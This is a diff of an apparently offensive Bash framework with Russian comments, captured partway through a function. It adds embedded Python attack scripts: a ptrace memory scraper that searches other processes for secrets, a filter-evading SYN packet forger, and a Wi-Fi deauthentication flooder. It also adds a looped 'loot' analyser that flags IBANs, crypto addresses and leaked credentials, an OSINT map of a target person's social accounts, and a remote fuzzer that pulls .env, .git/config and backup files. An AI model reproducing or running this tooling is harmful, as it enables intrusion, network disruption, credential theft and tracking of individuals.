@@ -518,7 +518,18 @@ GLOBAL_NETWORK_UA=(
 # ==============================================================================
 GLOBAL_REGEX_WEB_EXTENSIONS='\b[a-zA-Z0-9_\/\.-]+\.(php|php[0-9]|aspx?|jspx?|pdf|docx?|xlsx?|zip|gz|tar\.gz|tgz|rar|sql|db|sqlite|env|htaccess|htpasswd|bak|old|swp|log|conf|ini|json|ya?ml|git|key|pem|crt)\b'
 
+# Точечный паттерн для мгновенной классификации критических утечек и секретов
+GLOBAL_REGEX_CRITICAL_EXTS="\.(env|bak|sql|htaccess|git|conf|key|pem|htpasswd|old|swp|db|sqlite)$"
 
+# ==============================================================================
+# МАТРИЦЫ ДЛЯ АНАЛИЗА ИНФРАСТРУКТУРЫ И АРТЕФАКТОВ (INFRASTRUCTURE & STATIC CORE)
+# ==============================================================================
+
+# 1. Максимальный паттерн детекции исполняемых веб-скриптов и динамических страниц
+GLOBAL_REGEX_WEB_SCRIPTS="\.(php[0-9]?|phtml|phar|aspx?|ashx|asmx|axd|jspx?|do|action|cgi|pl|pyc?|rb|sh|bat|cmd|go|rs|js|ts|xsjs|pws|cfm|dll|so|exe)$"
+
+# 2. Сигнатурная матрица детекции заглушек хостинга, стандартных ошибок и ложных ответов (Анти-Мусор)
+GLOBAL_REGEX_HOSTING_WASTE="(<html>|40[0-9] (Forbidden|Not Found|Bad Request|Unauthorized)|50[0-9] (Bad Gateway|Internal Server Error|Service Unavailable)|InfinityFree|Hostinger|Cloudflare|Cloudfront|Sucuri|Incapsula|Under Construction|Site Built With|Powered by cPanel|Plesk|Default Web Site|Welcome to nginx|Apache/|LiteSpeed|IIS/|Tomcat|Jetty|WebSphere|Oracle-HTTP-Server|Phusion Passenger|404 Page)"
 # ==============================================================================
 # 5. СЛОВАРЬ ФАЗЗИНГА ЧУВСТВИТЕЛЬНЫХ ТОЧЕК И АРТЕФАКТОВ (ULTIMATE FUZZ WORDLIST)
 # ==============================================================================
@@ -919,6 +930,47 @@ GLOBAL_REGEX_NET_PORT_LINE="^[0-9]+/(tcp|udp)"
 # Ультимативная маска для детекции и отсечения всего диапазона Loopback (Localhost)
 # Блокирует адреса от 127.0.0.1 до 127.255.255.255 на любых интерфейсах
 GLOBAL_REGEX_NET_LOOPBACK="127\.[0-9]+\.[0-9]+\.[0-9]+"
+
+# Строгие маски для детекции частных (серых) подсетей согласно стандартам RFC 1918
+GLOBAL_REGEX_NET_PRIVATE_10="10\.[0-9]+\.[0-9]+\.[0-9]+"
+GLOBAL_REGEX_NET_PRIVATE_172="172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]+\.[0-9]+"
+GLOBAL_REGEX_NET_PRIVATE_192="192\.168\.[0-9]+\.[0-9]+"
+
+# Кросс-платформенные локальные алиасы имен хостов
+GLOBAL_REGEX_NET_LOCAL_NAMES="^(localhost|localhost\.localdomain|0\.0\.0\.0)$"
+
+
+# ==============================================================================
+# Сигнатуры для глубокого анализа исходного кода и веб-артефактов (SAST CORE)
+# ==============================================================================
+# 1. Максимальный контур детекции утечек конфигураций, СУБД и секретов доступа
+GLOBAL_REGEX_DB_LEAKS="\b(mysqli?_connect|PDO\s*\(|db_(password|user|pass|name|host|uri)|mysql_(connect|query)|pg_(connect|query)|connect_to_db|createConnection|MongoClient|mongoose\.connect|sqlite3\.Database|dotenv|config\.(json|yaml|ini)|DATABASE_URL|DB_(USERNAME|PASSWORD|DATABASE|HOST|PORT|CONN))\b"
+
+# 2. Максимальный контур детекции входящих веб-параметров, суперглобальных массивов и API-запросов
+GLOBAL_REGEX_WEB_INPUTS="\b(_POST|_GET|_REQUEST|_SERVER|_COOKIE|_FILES|POST\[|GET\[|REQUEST\[|req\.(body|query|params|cookies)|request\.(form|args|json|get_json)|ServletActionContext|@RequestParam|@RequestBody|@PathVariable|ParamUtil|r\.FormValue|r\.PostForm)\b"
+
+
+# 3. Максимальный контур детекции выполнения системных команд (RCE Риски)
+GLOBAL_REGEX_RCE_RISKS="\b(exec(ve|lp|p)?|system|passthru|shell_exec|popen|pclose|proc_open|subprocess\.(run|Popen|call|check_output)|child_process\.(exec|spawn|fork)|os\.(system|popen|spawn)|Runtime\.getRuntime\(\)\.exec|ProcessBuilder|syscall\.Exec)\b\s*\(?"
+
+# 4. Максимальный контур детекции файловых операций и динамического подключения (LFI/Path Traversal Риски)
+GLOBAL_REGEX_LFI_RISKS="\b(fopen|file_get_contents|include(_once)?|require(_once)?|readfile|file|parse_ini_file|open|read|fs\.(readFile|readFileSync|createReadStream)|io\.ReadFile|ioutil\.ReadFile|os\.Open|fs\.file_System|FileInputStream|FileReader)\b\s*\(?"
+
+
+# ==============================================================================
+# СИГНАТУРЫ ПОДСВЕТКИ И ВИЗУАЛИЗАЦИИ КОНТЕНТА (UI/UX HIGHLIGHT CORE)
+# ==============================================================================
+
+# 1. Максимальный паттерн детекции IPv4-адресов, сетевых сокетов и масок подсетей
+GLOBAL_SED_HIGHLIGHT_IP="-e s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\(:[0-9]\{1,5\}\)\?/${C}&${NC}/g"
+
+# 2. Ультимативный кросс-платформенный паттерн детекции учетных данных, секретов и API-ключей
+# Перекрывает любые комбинации: Password, Pass, Secret, Token, Key, Auth, User, Login, Root, Credentials, DB_
+GLOBAL_SED_HIGHLIGHT_SECRETS="-e s/\([Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd]\|[Pp][Aa][Ss][Ss]\|[Ss][Ee][Cc][Rr][Ee][Tt]\|[Tt][Oo][Kk][Ee][Nn]\|[Kk][Ee][Yy]\|[Aa][Uu][Tt][Hh]\|[Uu][Ss][Ee][Rr]\|[Ll][Oo][Gg][Ii][Nn]\|[Rr][Oo][Oo][Tt]\|[Cc][Rr][Ee][Dd][Ee][Nn][Tt][Ii][Aa][Ll][Ss]\|[Dd][Bb]_[Pp][Aa][Ss][Ss]\)[\"']\?[[:space:]]*[:==>-][\"']\?[[:space:]]*[^[:space:]\"\']*/${Y}&${NC}/g"
+
+# 3. Ультимативный кросс-платформенный паттерн детекции успешных триггеров, уязвимостей и полезных нагрузок
+# Перекрывает любые комбинации: BRUTE_SUCCESS, EXPLOIT_SUCCESS, Payload, SUCCESS, VULNERABLE, EXPLOIT, HIT, FOUND
+GLOBAL_SED_HIGHLIGHT_SUCCESS="-e s/\([Bb][Rr][Uu][Tt][Ee]_[Ss][Uu][Cc][Cc][Ee][Ss][Ss]\|[Ee][Xx][Pp][Ll][Oo][Ii][Tt]_[Ss][Uu][Cc][Cc][Ee][Ss][Ss]\|[Pp][Aa][Yy][Ll][Oo][Aa][Dd]\|[Ss][Uu][Cc][Cc][Ee][Ss][Ss]\|[Vv][Uu][Ll][Nn][Ee][Rr][Aa][Bb][Ll][Ee]\|[Ee][Xx][Pp][Ll][Oo][Ii][Tt]\|[Hh][Ii][Tt]\|[Ff][Oo][Uu][Nn][Dd]\)[\"']\?[[:space:]]*[:==>-]*\(.*\)/${G}&${NC}/g"
 
 
 # ==============================================================================
@@ -2323,6 +2375,109 @@ EOF
 }
 
 
+generate_mem_inject_code_raw() {
+    cat << 'EOF'
+import ctypes
+import os
+import sys
+
+# Константы для доступа к памяти
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+
+def read_process_memory(pid, search_str):
+    libc = ctypes.CDLL("libc.so.6")
+    
+    # Пытаемся прикрепиться к процессу (нужны права root)
+    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
+        print(f"[!] Failed to attach to PID {pid}")
+        return
+
+    print(f"[*] Scanning PID {pid} for sensitive patterns...")
+    
+    try:
+        # Читаем карты памяти процесса
+        with open(f"/proc/{pid}/maps", "r") as maps_file:
+            for line in maps_file:
+                if "rw-p" not in line: continue  # Нас интересуют только сегменты с чтением/записью
+                
+                parts = line.split()
+                addr_range = parts[0].split("-")
+                start = int(addr_range[0], 16)
+                end = int(addr_range[1], 16)
+                size = end - start
+                
+                # Читаем данные напрямую из /proc/pid/mem
+                with open(f"/proc/{pid}/mem", "rb", 0) as mem_file:
+                    mem_file.seek(start)
+                    try:
+                        chunk = mem_file.read(size)
+                        if search_str.encode() in chunk:
+                            print(f"[MATCH] Found '{search_str}' at 0x{start:x} in PID {pid}")
+                    except:
+                        continue
+    finally:
+        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
+
+if __name__ == "__main__":
+    if len(sys.argv) > 2:
+        read_process_memory(int(sys.argv[1]), sys.argv[2])
+EOF
+}
+
+
+generate_packet_forge_code_raw() {
+    cat << 'EOF'
+import sys
+from scapy.all import IP, TCP, send
+import random
+
+def forge_stealth_packet(target_ip, target_port):
+    # Создаем IP-слой со случайным ID для обхода простых фильтров
+    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
+    
+    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
+    # Это имитирует специфический стек ОС для обхода пассивных систем защиты
+    tcp_layer = TCP(sport=random.randint(1024, 65535), 
+                    dport=int(target_port), 
+                    flags="S", 
+                    window=random.choice([1024, 2048, 4096, 8192]))
+    
+    packet = ip_layer / tcp_layer
+    
+    try:
+        send(packet, verbose=False)
+        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
+    except Exception as e:
+        print(f"[ERROR] Injection failed: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) > 2:
+        forge_stealth_packet(sys.argv[1], sys.argv[2])
+    else:
+        print("Usage: python3 - <target_ip> <target_port>")
+EOF
+}
+
+generate_wifi_pulse_code_raw() {
+    cat << 'EOF'
+from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
+import sys
+
+def deauth_pulse(target_mac, gateway_mac, iface):
+    # Конструируем пакет деавторизации на уровне L2
+    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    
+    print(f"[*] Sending Silent Pulse (Deauth) to {target_mac} via {iface}")
+    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
+
+if __name__ == "__main__":
+    if len(sys.argv) > 3:
+        deauth_pulse(sys.argv[1], sys.argv[2], sys.argv[3])
+EOF
+}
+
 
 # ==========================================
 # 2. РАБОЧИЕ ФУНКЦИИ (Используют ядро)
@@ -3275,95 +3430,106 @@ run_network_intelligence() {
 }
 
 # ==============================================================================
-# @description: Центральный мост консолидации сигналов и эвристического декодинга (run_deep_bridge)
+# @description: Центральный мост консолидации сигналов и эвристического декодинга
+# ПОЛНАЯ АВТОНОМИЯ: Безусловный цикл обработки логов без интерактивных пауз
 # ==============================================================================
 run_deep_bridge() {
     clear
     # Слой 1: Заголовок через компоненты интерфейса Ядра
-    core_engine_ui "h" "PRIME BRIDGE: NEURAL INTELLIGENCE LINK v2.0"
+    core_engine_ui "h" "PRIME BRIDGE: NEURAL INTELLIGENCE LINK v3.6 (TOTAL INTEGRATION)"
     
-    # Синхронизация путей согласно архитектуре фреймворка
-    local loot_dir="$BASE_DIR/loot"
-    local pool="/tmp/bridge_pool_$RANDOM.tmp"
+    # Синхронизация путей согласно глобальной архитектуре фреймворка
+    local loot_dir="${PRIME_LOOT:-./prime_loot}"
     local master_loot="$loot_dir/master_intelligence.log"
+    mkdir -p "$loot_dir" 2>/dev/null
     
-    mkdir -p "$loot_dir"
-    
-    # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Изоляция от циклической записи) ---
-    # Собираем данные изо всех логов, исключая мастер-лог из выборки во избежание конфликтов
-    if ls "$loot_dir"/*.log &>/dev/null; then
-        touch "$master_loot"
-        sort -u "$loot_dir"/*.log 2>/dev/null | grep -v '^$' | grep -v "master_intelligence" > "$pool"
-    fi
-    
-    # Безусловная проверка пула без использования тяжелых конструкций IF
-    [[ ! -s "$pool" ]] && { 
-        core_engine_ui "w" "Ожидание сигналов разведки... База трофеев чиста."
-        rm -f "$pool"
-        core_engine_wait
-        return
-    }
-
-    local total_threads=$(wc -l < "$pool")
-    core_engine_ui "i" "Анализ $total_threads активных потоков метаданных..."
-    core_engine_ui "line" ""
-    
-    core_engine_progress 3 "DECODING_INTELLIGENCE_POOL"
-    sleep 1
-
-    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ЯДРА ---
-    while read -r line; do
-        # Очистка входящей строки от технического шума и разделителей
-        local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
+    # Бесконечный цикл автономного мониторинга входящих сигналов
+    while true; do
+        local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
+        local pool="/tmp/bridge_pool_$RANDOM.tmp"
         
-        # 1. Детекция криптографических хэшей через глобальные регулярки ядра
-        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_MD5"; then
-            core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт MD5 -> $raw_data"
-            continue
+        # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Изоляция от циклической записи) ---
+        if ls "$loot_dir"/*.log &>/dev/null; then
+            touch "$master_loot"
+            sort -u "$loot_dir"/*.log 2>/dev/null | grep -v '^$' | grep -v "master_intelligence" > "$pool"
         fi
-        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_SHA256"; then
-            core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт SHA-256 -> $raw_data"
+        
+        # Безусловная проверка пула без использования тяжелых конструкций IF
+        [[ ! -s "$pool" ]] && { 
+            core_engine_ui "w" "[$timestamp] Ожидание сигналов разведки... База трофеев чиста."
+            rm -f "$pool"
+            sleep 15  # Автономная пауза ожидания перед новым кругом проверки
             continue
-        fi
+        }
 
-        # 2. Финансовый сектор: Детекция валидных IBAN (Стратегия Банковский Гамбит)
-        if [[ "$raw_data" =~ ^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30} ]]; then
-            core_engine_ui "s" "RESONANCE: Финансовый актив (IBAN) верифицирован -> $raw_data"
-            continue
-        fi
+        local total_threads=$(wc -l < "$pool")
+        core_engine_ui "line" ""
+        core_engine_ui "i" "[$timestamp] Анализ $total_threads active потоков метаданных..."
+        core_engine_ui "w" "Контур: Автопилот моста. Для остановки нажмите [CTRL+C]"
+        core_engine_ui "line" ""
+        
+        core_engine_progress 3 "DECODING_INTELLIGENCE_POOL"
 
-        # 3. Финансовый сектор: Поиск следов крипто-транзакций (BTC / ETH)
-        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_CRYPTO_BTC"; then
-            core_engine_ui "s" "RESONANCE: Блокчейн-след (Bitcoin Asset) зафиксирован."
-            continue
-        fi
-        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_CRYPTO_ETH"; then
-            core_engine_ui "s" "RESONANCE: Блокчейн-след (Ethereum Asset) зафиксирован."
-            continue
-        fi
+        # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ЯДРА ---
+        while read -r line; do
+            [[ -z "$line" ]] && continue
+            
+            # Очистка входящей строки от технического шума и разделителей
+            local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
+            
+            # 1. Детекция криптографических хэшей через твои ГЛОБАЛЬНЫЕ регулярки
+            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_MD5"; then
+                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт MD5 -> $raw_data"
+                continue
+            fi
+            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_SHA256"; then
+                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт SHA-256 -> $raw_data"
+                continue
+            fi
 
-        # 4. Анализ утечек идентификаторов через глобальные сигнатуры форензики
-        if echo "$raw_data" | grep -qiE "$GLOBAL_SIG_FORENSIC_CONFIG"; then
-            core_engine_ui "w" "RESONANCE: Критическая утечка учетных данных / Secret Leak"
-            continue
-        fi
+            # 2. Финансовый сектор: Детекция валидных IBAN через твою ГЛОБАЛЬНУЮ регулярку
+            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_FIN_IBAN"; then
+                core_engine_ui "s" "RESONANCE: Финансовый актив (IBAN) верифицирован -> $raw_data"
+                continue
+            fi
 
-        # 5. Инфраструктурный анализ скрытых сетей (Dark Web Gateways)
-        if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_DARKWEB"; then
-            core_engine_ui "e" "RESONANCE: Обнаружена скрытая точка маршрутизации Dark Web"
-            continue
-        fi
+            # 3. УЛЬТИМАТИВНЫЙ КРИПТО-КОНТУР: Динамический перебор матрицы GLOBAL_CRYPTO_TYPES
+            local crypto_matched=0
+            for crypto_entry in "${GLOBAL_CRYPTO_TYPES[@]}"; do
+                local regex_pattern="${crypto_entry%%|*}"
+                local crypto_desc="${crypto_entry#*|}"
+                
+                if echo "$raw_data" | grep -qE "$regex_pattern"; then
+                    core_engine_ui "s" "RESONANCE: Блокчейн-след ($crypto_desc) зафиксирован -> $raw_data"
+                    crypto_matched=1
+                    break
+                fi
+            done
+            [[ "$crypto_matched" -eq 1 ]] && continue
 
-    done < "$pool"
+            # 4. Анализ утечек идентификаторов через ГЛОБАЛЬНЫЙ комплекс статического анализа
+            if echo "$raw_data" | grep -qiE "$GLOBAL_STATIC_SIGNATURES"; then
+                core_engine_ui "w" "RESONANCE: Критическая утечка данных / Артефакт Сигнатуры -> $raw_data"
+                continue
+            fi
 
-    # --- СЛОЙ 3: СИНХРОНИЗАЦИЯ И САНИТАРНАЯ ОЧИСТКА ---
-    # Аппендим результаты анализа в главный исторический лог фреймворка
-    cat "$pool" >> "$master_loot"
-    rm -f "$pool"
-    
-    core_engine_ui "line" ""
-    core_engine_ui "i" "Синхронизация потоков нейро-моста успешно завершена."
-    core_engine_wait
+            # 5. Инфраструктурный анализ скрытых сетей и Web3 через твою ГЛОБАЛЬНУЮ переменную
+            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_DARKWEB"; then
+                core_engine_ui "e" "RESONANCE: Обнаружен маршрут Скрытой Сети / Web3 Node -> $raw_data"
+                continue
+            fi
+
+        done < "$pool"
+
+        # --- СЛОЙ 3: СИНХРОНИЗАЦИЯ И САНИТАРНАЯ ОЧИСТКА ---
+        cat "$pool" >> "$master_loot"
+        rm -f "$pool"
+        
+        core_engine_ui "line" ""
+        core_engine_ui "s" "Синхронизация потоков нейро-моста успешно завершена. Ожидание..."
+        
+        sleep 30
+    done
 }
 
 suggest_action() {
@@ -3890,8 +4056,6 @@ run_prime_exploiter_v5() {
     core_engine_wait
 }
 
-
-
 # ==============================================================================
 # @description: Единый конвейер автоматической корреляции, сборки и экспорта
 # ==============================================================================
@@ -3951,14 +4115,94 @@ run_nexus_full_pipeline() {
     
     echo "  [ ТОПОЛОГИЯ ЦИФРОВОГО СЛЕДА ОБЪЕКТА: $current_target ]"
     echo "                      "
-    echo "       [Instagram] <--- (Профиль) ---+ "
-    echo "                                      | "
-    echo "       [TikTok]    <--- (Медиа) -----+---> [ $current_target ]"
-    echo "                                      | "
-    echo "       [Telegram]  <--- (Связь) -----+ "
-    echo "                                      | "
-    echo "       [Reddit]    <--- (Форумы) ----+ "
-    echo "                      "
+
+    # Динамический сбор категориальных групп на основе GLOBAL_OSINT_SITES
+    local list_social="" list_dev="" list_blog="" list_media="" list_design="" list_gaming="" list_commerce=""
+
+    for entry in "${GLOBAL_OSINT_SITES[@]}"; do
+        [[ "$entry" != *"|"* ]] && continue
+        local category=$(echo "$entry" | awk -F'|' '{print $4}')
+        local service_name=$(echo "$entry" | awk -F'|' '{print $5}')
+        [[ -z "$service_name" ]] && continue
+
+        case "$category" in
+            "SOCIAL")   list_social="$list_social $service_name" ;;
+            "DEV")      list_dev="$list_dev $service_name" ;;
+            "BLOG")     list_blog="$list_blog $service_name" ;;
+            "MEDIA")    list_media="$list_media $service_name" ;;
+            "DESIGN")   list_design="$list_design $service_name" ;;
+            "GAMING")   list_gaming="$list_gaming $service_name" ;;
+            "COMMERCE") list_commerce="$list_commerce $service_name" ;;
+        esac
+    done
+
+    # Инициализация структуры карты в Markdown-отчете
+    echo -e "\n## СЕМАНТИЧЕСКАЯ КАРТА И ТОПОЛОГИЯ СВЯЗЕЙ" >> "$target_report"
+    echo "--------------------------------------------------" >> "$target_report"
+    echo "```" >> "$target_report"
+
+    # Линейный вывод дерева топологии на экран и логгирование в файл без ANSI-кодов
+    local node_str=""
+
+    node_str="       [ ЯДРО ОБЪЕКТА ] ══════> (Идентификатор: ${G}$current_target${NC})"
+    echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+    
+    node_str="              ║"
+    echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+
+    if [[ -n $(echo "$list_social" | xargs) ]]; then
+        node_str="              ╠═══ [ Сектор: SOCIAL & MESSENGERS ]"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        for item in $list_social; do
+            node_str="              ║     ╚═══> ($item)"
+            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        done
+        node_str="              ║"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+    fi
+
+    if [[ -n $(echo "$list_dev" | xargs) ]]; then
+        node_str="              ╠═══ [ Сектор: DEV & TECH INFRA ]"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        for item in $list_dev; do
+            node_str="              ║     ╚═══> ($item)"
+            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        done
+        node_str="              ║"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+    fi
+
+    if [[ -n $(echo "$list_blog" | xargs) ]]; then
+        node_str="              ╠═══ [ Сектор: BLOGS & FORUMS ]"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        for item in $list_blog; do
+            node_str="              ║     ╚═══> ($item)"
+            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        done
+        node_str="              ║"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+    fi
+
+    if [[ -n $(echo "$list_media" | xargs) ]]; then
+        node_str="              ╠═══ [ Сектор: MEDIA & STREAMING ]"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        for item in $list_media; do
+            node_str="              ║     ╚═══> ($item)"
+            echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+        done
+        node_str="              ║"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+    fi
+
+    node_str="              ╚═══ [ Сектор: DESIGN, GAMING & FREELANCE ]"
+    echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+    for item in $list_design $list_gaming $list_commerce; do
+        node_str="                    ╚═══> ($item)"
+        echo -e "$node_str" && echo "$node_str" | sed 's/\x1b\[[0-9;]*m//g' >> "$target_report"
+    done
+
+    echo "```" >> "$target_report"
+    echo ""
 
     # Вывод критических зацепок на экран (Безопасный grep фиксированных строк)
     if [[ -f "$target_report" ]]; then
@@ -4009,9 +4253,11 @@ run_nexus_full_pipeline() {
 }
 
 
-
 # --- PRIME OMEGA AUDITOR v2.5 [GHOST_SPEED] ---
-# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ГЛУБОКОГО АНАЛИЗА ---
+# ==============================================================================
+# @description: Вспомогательная функция глубокого анализа исходного кода
+# ПОЛНАЯ АВТОНОМИЯ: Глобальный сигнатурный анализ (SAST CORE)
+# ==============================================================================
 run_deep_file_probe() {
     local host="$1"
     local target_file="$2"
@@ -4019,26 +4265,52 @@ run_deep_file_probe() {
 
     core_engine_ui "i" "Deep Probing: $target_file..."
     
-    # Загружаем заголовок файла (первые 2кб достаточно для анализа логики)
+    # Загружаем заголовок файла (первые 2кб для анализа структуры)
     local sample=$(curl -s -k -L --max-time 5 "https://$host/$target_file" | head -c 2048)
     local leaks=""
+    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
 
-    # Эвристика: поиск паттернов уязвимостей
-    echo "$sample" | grep -qiE "mysqli_connect|PDO\(|db_password|db_user|root" && leaks+="${R}[!] DB_LEAK: Connection string detected${NC}\n"
-    echo "$sample" | grep -qiE "POST\[|GET\[|REQUEST\[" && leaks+="${Y}[*] LOGIC: Entry point for data detected${NC}\n"
-    echo "$sample" | grep -qiE "exec\(|system\(|passthru\(" && leaks+="${R}[!] RCE_RISK: System command execution${NC}\n"
-    echo "$sample" | grep -qiE "fopen\(|file_get_contents\(" && leaks+="${B}[i] LFI_RISK: File operations detected${NC}\n"
+    # 1. Эвристика: Поиск утечек СУБД / Конфигов
+    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_DB_LEAKS"; then
+        leaks+="${R}[!] DB_LEAK: Connection string, config environment or database credentials detected${NC}\n"
+    fi
 
+    # 2. Эвристика: Поиск точек входа / Веб-параметров
+    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_WEB_INPUTS"; then
+        leaks+="${Y}[*] LOGIC: Entry point for data detected (Cross-Platform Web Inputs)${NC}\n"
+    fi
+
+    # 3. Эвристика: Поиск системных вызовов (RCE)
+    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_RCE_RISKS"; then
+        leaks+="${R}[!] RCE_RISK: System command execution detected (Critical Internal Call)${NC}\n"
+    fi
+
+    # 4. Эвристика: Поиск файловых операций / Инклудов (LFI)
+    if echo "$sample" | grep -qiE "$GLOBAL_REGEX_LFI_RISKS"; then
+        leaks+="${B}[i] LFI_RISK: File operations / Dynamic inclusion detected${NC}\n"
+    fi
+
+    # Фиксация результатов при обнаружении аномалий
     if [[ -n "$leaks" ]]; then
         echo -e "      |--- ANALYSIS:\n$(echo -e "$leaks" | sed 's/^/      | /')"
-        # Сохраняем "грязный" файл в лут для ручного разбора
-        echo "$sample" > "$PRIME_LOOT/probe_${target_file//\//_}_$(date +%s).php"
+        
+        # Безопасное сохранение "грязного" файла в лут для ручного разбора
+        mkdir -p "$loot_dir"
+        echo "$sample" > "$loot_dir/probe_${target_file//\//_}_$(date +%s).php"
     fi
 }
 
-# --- ОСНОВНОЙ АУДИТОР ---
+# ==============================================================================
+# @description: Основной диспетчер верификации конфигурации веб-ресурсов
+# ПОЛНАЯ АВТОНОМИЯ: Параллельный движок на базе GLOBAL_FUZZ_WORDLIST и EXTENSIONS
+# ==============================================================================
 run_prime_auditor_v2() {
     local host="$1"
+    local tmp_pipe="/tmp/prime_pipe_$$"
+    local tag=""
+    local target=""
+    local head_check=""
+    
     core_engine_ui "h" "OMEGA AUDITOR v5.1 (Deep Probe / Parallel)"
 
     # 1. ПОЛУЧЕНИЕ ЦЕЛИ
@@ -4048,7 +4320,12 @@ run_prime_auditor_v2() {
     [[ -z "$host" ]] && return
 
     # 2. ЭВРИСТИКА БЕЗОПАСНОСТИ
-    if [[ "$host" =~ ^(127\.|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|localhost) ]]; then
+    # Использование глобальных сетевых фильтров изоляции (RFC 1918 / Loopback)
+    if [[ "$host" =~ $GLOBAL_REGEX_NET_LOOPBACK ]] || \
+       [[ "$host" =~ $GLOBAL_REGEX_NET_PRIVATE_10 ]] || \
+       [[ "$host" =~ $GLOBAL_REGEX_NET_PRIVATE_172 ]] || \
+       [[ "$host" =~ $GLOBAL_REGEX_NET_PRIVATE_192 ]] || \
+       [[ "$host" =~ $GLOBAL_REGEX_NET_LOCAL_NAMES ]]; then
         core_engine_ui "i" "Local target detected. Skipping Anonymity Check."
     else
         core_engine_validator "privacy" "" "Security Shield" || return
@@ -4059,20 +4336,18 @@ run_prime_auditor_v2() {
     core_engine_validator "net_up" "$host" "Availability" || return
 
     # 4. ПАРАЛЛЕЛЬНЫЙ ДВИЖОК
-    local tmp_pipe="/tmp/prime_pipe_$$"
-    local vuln_links=""
     touch "$tmp_pipe"
-
     core_engine_ui "i" "Deploying Parallel Engines on: $host"
 
-    ( # Поток А: Краулинг контента
-        local discovered=$(curl -s -k -L --max-time 5 "https://$host" | grep -oE '[a-zA-Z0-9_\/\.-]+\.(php|pdf|docx|xlsx|zip|sql|env|htaccess)' | sort -u)
-        for t in $discovered; do echo "HIT|$t" >> "$tmp_pipe"; done
+    ( # Поток А: Краулинг контента (Сбор данных по ультимативной глобальной матрице расширений)
+        local discovered=$(curl -s -k -L --max-time 5 "https://$host" | grep -oE "$GLOBAL_REGEX_WEB_EXTENSIONS" 2>/dev/null | sort -u)
+        for t in $discovered; do 
+            echo "HIT|$t" >> "$tmp_pipe"
+        done
     ) &
 
-    ( # Поток Б: Скрытые директории/файлы
-        local fuzz=(".env" ".htaccess" "backup.sql" "config.php.bak" ".git/config" "phpinfo.php" "wp-config.php" "config.php")
-        for f in "${fuzz[@]}"; do
+    ( # Поток Б: Скрытые директории/файлы (Итерация по глобальному словарю фаззинга)
+        for f in "${GLOBAL_FUZZ_WORDLIST[@]}"; do
             local res=$(curl -s -k -L -I -w "%{http_code}" -o /dev/null --connect-timeout 3 "https://$host/$f")
             [[ "$res" == "200" ]] && echo "HIT|$f" >> "$tmp_pipe"
         done
@@ -4084,13 +4359,16 @@ run_prime_auditor_v2() {
     core_engine_ui "line"
     echo -e "${Y}>>> AUDIT REPORT: $host <<<${NC}"
 
-    while IFS='|' read -r type target; do
